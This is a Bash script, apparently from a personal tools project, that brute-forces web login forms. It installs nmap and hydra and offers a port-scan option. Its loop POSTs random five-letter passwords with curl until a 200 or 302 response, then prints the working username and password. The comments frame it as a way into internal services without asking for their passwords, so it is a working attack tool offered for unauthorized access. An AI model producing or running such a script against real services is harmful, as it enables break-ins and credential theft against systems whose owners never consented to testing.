#!/bin/bash
# ------------------------------
# ABOUT:
# Lightweight brute-force for access to not-so-important inner services.
# Oftentimes it's much faster than asking and useless waiting for dumb password for required service.
#
# Zero-config, use only CLI arguments.
#
# USAGE:
# CMD username:@http://example.com/
#
# NOTES:
# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
#
# AUTHOR:
# @zhibirc
# ------------------------------

if [[ -f "$HOME/.config/automa-sh-ion/.config" ]]; then
    # shellcheck disable=SC1090
    . "$HOME/.config/automa-sh-ion/.config"
fi

# shellcheck disable=SC1090
. "$HOME/$CLI_TOOLS_PATH/libs/colors.sh"
# shellcheck disable=SC1090
# TODO: remove after development
. "$HOME/Work/Projects/Pets/automa-sh-ion/tools/light.brute/strategies.sh"
# . "$HOME/$CLI_TOOLS_PATH/light.brute/strategies.sh"

declare VERSION='v0.0.1'
declare HELP='Usage: CMD username:@http://example.com/'
declare DEBUG=false

if [[ $# -eq 0 ]]; then
    echo -e "${COLOR_RED}Invalid call syntax!${COLOR_RESET}"
    echo "$HELP"

    exit 1
fi


function debug () {
    if [[ $DEBUG = true ]]; then
        echo ""
        declare -p "$1"
        echo ""
    fi
}


clear

case $1 in
    -h|--help)
        echo "$HELP"

        exit 0
        ;;
    -V|--version)
        echo "$VERSION"

        exit 0
        ;;
    -d)
        DEBUG=true
        ;;
esac

if sudo apt-get update && sudo apt-get install -y nmap hydra; then
    echo -e "${COLOR_GREEN}Required installations done!${COLOR_RESET}"
else
    echo -e "${COLOR_RED}Required installations failed!${COLOR_RESET}"

    exit 1
fi

PS3='Select a test strategy from the list above: '

options=('HTTP response code based' 'Cookie based' 'Scan' 'Quit')

select option in "${options[@]}"; do
    case $option in
        'HTTP response code based')
            read -r -p 'Select a characters amount of generated string: ' random_length

            generate_random "$random_length"
            break
            ;;
        'Cookie based')
            echo 'Cookie based'
            break
            ;;
        'Scan')
            echo -e "\n${COLOR_GREEN}############################## Running Port Scan ##############################${COLOR_RESET}\n"
            scan
            echo -e "\n${COLOR_GREEN}############################## Port Scan Finished ##############################${COLOR_RESET}\n"
            break
            ;;
        'Quit')
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

declare -r targets=("$@")
declare -A targets_map

# prepare targets
# note that there are no strict checks here
for target in "${targets[@]}"; do
    # if we have some credentials
    if [[ "$target" == *"@"* ]]; then
        credentials=$(echo "$target" | cut -d @ -f 1)
        url=$(echo "$target" | cut -d @ -f 2)
        targets_map["$url"]="$credentials"
    else
        targets_map["$target"]=''
    fi
done

for target in "${!targets_map[@]}"; do
    url=$target
    credentials=${targets_map[$target]}
    login=$(echo $credentials | cut -f 1 -d :)
    password=$(echo $credentials | cut -f 2 -d :)

    echo "$url"
    echo "$login"
    echo "$password"

    http_response_code=$(curl --data "username=$login&password=$password" "$url" -w '%{http_code}' -o /dev/null -s)

    while [[ "$http_response_code" -ne 200 && "$http_response_code" -ne 302 ]]; do
        password=$(tr -dc a-z < /dev/urandom | head -c 5 | xargs)
        http_response_code=$(curl --data "username=$login&password=$password" "$url" -w '%{http_code}' -o /dev/null -s)
    done

    echo -e "${COLOR_GREEN}Success: $target [$login:$password].${COLOR_RESET}"
    break 2
done
